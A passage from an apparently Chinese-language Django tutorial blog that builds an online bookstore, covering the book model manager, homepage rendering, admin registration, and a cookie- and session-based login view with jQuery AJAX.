class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'s_books'</span></span><br><span class="line">        verbose_name = <span class="string">'书籍'</span></span><br><span class="line">        verbose_name_plural = <span class="string">'书籍'</span></span><br></pre></td></tr></table></figure><p>同样，我们这里再写一下BooksManager()，有一些基本功能在这里抽象出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BooksManager</span><span class="params">(models.Manager)</span>:</span></span><br><span class="line">    <span class="string">'''商品模型管理器类'''</span></span><br><span class="line">    <span class="comment"># sort='new' 按照创建时间进行排序</span></span><br><span class="line">    <span class="comment"># sort='hot' 按照商品销量进行排序</span></span><br><span class="line">    <span class="comment"># sort='price' 按照商品的价格进行排序</span></span><br><span class="line">    <span class="comment"># sort= 按照默认顺序排序</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_books_by_type</span><span class="params">(self, type_id, limit=None, sort=<span class="string">'default'</span>)</span>:</span></span><br><span class="line">        <span class="string">'''根据商品类型id查询商品信息'''</span></span><br><span class="line">        <span class="keyword">if</span> sort == <span class="string">'new'</span>:</span><br><span class="line">            order_by = (<span class="string">'-create_time'</span>,)</span><br><span class="line">        <span class="keyword">elif</span> sort == <span class="string">'hot'</span>:</span><br><span class="line">            order_by = (<span class="string">'-sales'</span>, )</span><br><span class="line">        <span class="keyword">elif</span> sort == <span class="string">'price'</span>:</span><br><span class="line">            order_by = (<span class="string">'price'</span>, )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            order_by = (<span class="string">'-pk'</span>, ) <span class="comment"># 按照primary key降序排列。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询数据</span></span><br><span class="line">        books_li = self.filter(type_id=type_id).order_by(*order_by)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询结果集的限制</span></span><br><span class="line">        <span class="keyword">if</span> limit:</span><br><span class="line">            books_li = books_li[:limit]</span><br><span class="line">        <span class="keyword">return</span> books_li</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_books_by_id</span><span class="params">(self, books_id)</span>:</span></span><br><span class="line">        <span class="string">'''根据商品的id获取商品信息'''</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            books = self.get(id=books_id)</span><br><span class="line">        <span class="keyword">except</span> self.model.DoesNotExist:</span><br><span class="line">            <span class="comment"># 不存在商品信息</span></span><br><span class="line">            books = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">return</span> books</span><br></pre></td></tr></table></figure><p>做数据库迁移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py makemigrations books</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python manage.py migrate</span></span><br></pre></td></tr></table></figure><p>好，接下来我们就可以将首页index.html渲染出来了。现在根urls.py中配置url。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^'</span>, include(<span class="string">'books.urls'</span>, namespace=<span class="string">'books'</span>)), <span class="comment"># 商品模块</span></span><br></pre></td></tr></table></figure><p>然后在books app中的urls.py中配置url。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> books <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.index, name=<span class="string">'index'</span>), <span class="comment"># 首页</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="2，编写书籍表视图函数。"><a href="#2，编写书籍表视图函数。" class="headerlink" title="2，编写书籍表视图函数。"></a>2，编写书籍表视图函数。</h2><p>然后编写视图文件views.py。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># books/views.py</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"><span class="keyword">from</span> books.enums <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.core.paginator <span class="keyword">import</span> Paginator</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''显示首页'''</span></span><br><span class="line">    <span class="comment"># 查询每个种类的3个新品信息和4个销量最好的商品信息</span></span><br><span class="line">    python_new = Books.objects.get_books_by_type(PYTHON, limit=<span class="number">3</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    python_hot = Books.objects.get_books_by_type(PYTHON, limit=<span class="number">4</span>, sort=<span class="string">'hot'</span>)</span><br><span class="line">    javascript_new = Books.objects.get_books_by_type(JAVASCRIPT,limit= <span class="number">3</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    javascript_hot = Books.objects.get_books_by_type(JAVASCRIPT, limit=<span class="number">4</span>, sort=<span class="string">'hot'</span>)</span><br><span class="line">    algorithms_new = Books.objects.get_books_by_type(ALGORITHMS, <span class="number">3</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    algorithms_hot = Books.objects.get_books_by_type(ALGORITHMS, <span class="number">4</span>, sort=<span class="string">'hot'</span>)</span><br><span class="line">    machinelearning_new = Books.objects.get_books_by_type(MACHINELEARNING, <span class="number">3</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    machinelearning_hot = Books.objects.get_books_by_type(MACHINELEARNING, <span class="number">4</span>, sort=<span class="string">'hot'</span>)</span><br><span class="line">    operatingsystem_new = Books.objects.get_books_by_type(OPERATINGSYSTEM, <span class="number">3</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    operatingsystem_hot = Books.objects.get_books_by_type(OPERATINGSYSTEM, <span class="number">4</span>, sort=<span class="string">'hot'</span>)</span><br><span class="line">    database_new = Books.objects.get_books_by_type(DATABASE, <span class="number">3</span>, sort=<span class="string">'new'</span>)</span><br><span class="line">    database_hot = Books.objects.get_books_by_type(DATABASE, <span class="number">4</span>, sort=<span class="string">'hot'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义模板上下文</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'python_new'</span>: python_new,</span><br><span class="line">        <span class="string">'python_hot'</span>: python_hot,</span><br><span class="line">        <span class="string">'javascript_new'</span>: javascript_new,</span><br><span class="line">        <span class="string">'javascript_hot'</span>: javascript_hot,</span><br><span class="line">        <span class="string">'algorithms_new'</span>: algorithms_new,</span><br><span class="line">        <span class="string">'algorithms_hot'</span>: algorithms_hot,</span><br><span class="line">        <span class="string">'machinelearning_new'</span>: machinelearning_new,</span><br><span class="line">        <span class="string">'machinelearning_hot'</span>: machinelearning_hot,</span><br><span class="line">        <span class="string">'operatingsystem_new'</span>: operatingsystem_new,</span><br><span class="line">        <span class="string">'operatingsystem_hot'</span>: operatingsystem_hot,</span><br><span class="line">        <span class="string">'database_new'</span>: database_new,</span><br><span class="line">        <span class="string">'database_hot'</span>: database_hot,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 使用模板</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'books/index.html'</span>, context)</span><br></pre></td></tr></table></figure><p>然后将index.html拷贝到templates/books。</p><h2 id="3，将Books注册到后台管理系统admin"><a href="#3，将Books注册到后台管理系统admin" class="headerlink" title="3，将Books注册到后台管理系统admin"></a>3，将Books注册到后台管理系统admin</h2><p>再将Books这个model注册到admin里面，方便管理，可以用来在后台编辑商品信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># books/admin.py</span></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"><span class="comment"># Register your models here.</span></span><br><span class="line"></span><br><span class="line">admin.site.register(Books) <span class="comment"># 在admin中添加有关商品的编辑功能。</span></span><br></pre></td></tr></table></figure><p>然后我们创建超级管理员账户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py createsuperuser</span></span><br></pre></td></tr></table></figure><p>这样我们就可以登陆admin来管理商品信息了，admin功能是django的杀手锏之一。<br>接下来我们要把index.html中的文件路径改一下，要不然显示不出来。<br>我们通过分析模板来改写成后端渲染出来的模板。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> book <span class="keyword">in</span> python_new %&#125;</span><br><span class="line">    &lt;a href="#"&gt;&#123;&#123; book.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>用来替换掉<code>index.html</code>中的：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python核心编程<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>笨办法学Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python学习手册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>用代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for book in python_hot %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"prize"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p><p>替换掉<code>index.html</code>中的：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python核心编程<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/book/book001.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"prize"</span>&gt;</span>¥ 30.00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python学习手册<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/book/book002.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"prize"</span>&gt;</span>¥ 5.50<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python Cookbook<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/book/book003.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"prize"</span>&gt;</span>¥ 3.90<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python高性能编程<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/book/book004.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"prize"</span>&gt;</span>¥ 25.80<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>由于我们在编辑商品信息时，需要上传书籍的图片，所以在配置文件中设置图片存放目录。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">"static"</span>)</span><br></pre></td></tr></table></figure><p>我们将’/static/images/…’的格式改成django里面推荐的用法。<br>在index.html开头添加</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">load</span></span> staticfiles %&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><p>并改写静态文件url格式为：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"</span></span></span><span class="template-tag">&#123;% <span class="name"><span class="name">static</span></span> book.image %&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>好，那我们首页的渲染工作也就完成了。</p><h2 id="4，从注册页跳转到首页"><a href="#4，从注册页跳转到首页" class="headerlink" title="4，从注册页跳转到首页"></a>4，从注册页跳转到首页</h2><p>接下来我们将register.html注册完以后，跳转到首页去。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># user/views.py</span></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="keyword">reverse</span>(<span class="string">'books:index'</span>))</span><br></pre></td></tr></table></figure><p>做完注册和首页，我们可以来做登陆页面了。将login.html拷贝到templates/users/下。<br>注意修改静态文件路径。然后编写/users/views.py文件中的login功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''显示登录页面'''</span></span><br><span class="line">    <span class="keyword">if</span> request.COOKIES.get(<span class="string">"username"</span>):</span><br><span class="line">        username = request.COOKIES.get(<span class="string">"username"</span>)</span><br><span class="line">        checked = <span class="string">'checked'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = <span class="string">''</span></span><br><span class="line">        checked = <span class="string">''</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'checked'</span>: checked,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'users/login.html'</span>, context)</span><br></pre></td></tr></table></figure><p>将url配置到urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^login/$'</span>, views.login, name=<span class="string">'login'</span>) <span class="comment"># 显示登陆页面</span></span><br></pre></td></tr></table></figure><p>好，我们显示登陆页面也做完了。</p><h2 id="5，登陆功能的实现。"><a href="#5，登陆功能的实现。" class="headerlink" title="5，登陆功能的实现。"></a>5，登陆功能的实现。</h2><p>我们先来实现登录数据校验的功能。还有记住用户名的功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/views.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_check</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''进行用户登录校验'''</span></span><br><span class="line">    <span class="comment"># 1.获取数据</span></span><br><span class="line">    username = request.POST.get(<span class="string">'username'</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">'password'</span>)</span><br><span class="line">    remember = request.POST.get(<span class="string">'remember'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([username, password, remember]):</span><br><span class="line">        <span class="comment"># 有数据为空</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.进行处理:根据用户名和密码查找账户信息</span></span><br><span class="line">    passport = Passport.objects.get_one_passport(username=username, password=password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> passport:</span><br><span class="line">        next_url = reverse(<span class="string">'books:index'</span>) <span class="comment"># /user/</span></span><br><span class="line">        jres = JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'next_url'</span>: next_url&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断是否需要记住用户名</span></span><br><span class="line">        <span class="keyword">if</span> remember == <span class="string">'true'</span>:</span><br><span class="line">            <span class="comment"># 记住用户名</span></span><br><span class="line">            jres.set_cookie(<span class="string">'username'</span>, username, max_age=<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不要记住用户名</span></span><br><span class="line">            jres.delete_cookie(<span class="string">'username'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记住用户的登录状态</span></span><br><span class="line">        request.session[<span class="string">'islogin'</span>] = <span class="keyword">True</span></span><br><span class="line">        request.session[<span class="string">'username'</span>] = username</span><br><span class="line">        request.session[<span class="string">'passport_id'</span>] = passport.id</span><br><span class="line">        <span class="keyword">return</span> jres</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 用户名或密码错误</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><p>这个函数在前端发送数据是调用。我们在前端编写一段发送ajax post请求的html代码和jquery代码。将下面这段代码替换掉表单代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; % csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"name_input"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; username &#125;&#125;"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"user_error"</span>&gt;</span>输入错误<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"pwd"</span> <span class="attr">class</span>=<span class="string">"pass_input"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pwd_error"</span>&gt;</span>输入错误<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"more_input clearfix"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"remember"</span> &#123;&#123; <span class="attr">checked</span> &#125;&#125;&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>记住用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>忘记密码<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btnLogin"</span> <span class="attr">value</span>=<span class="string">"登录"</span> <span class="attr">class</span>=<span class="string">"input_submit"</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-1.12.4.min.js' %&#125;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnLogin'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val()</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> password = $(<span class="string">"#pwd"</span>).val()</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> remember = $(<span class="string">'input[name="remember"]'</span>).prop(<span class="string">'checked'</span>)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> csrfmiddlewaretoken = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span></span><br><span class="line"><span class="undefined"></span></span><br><span 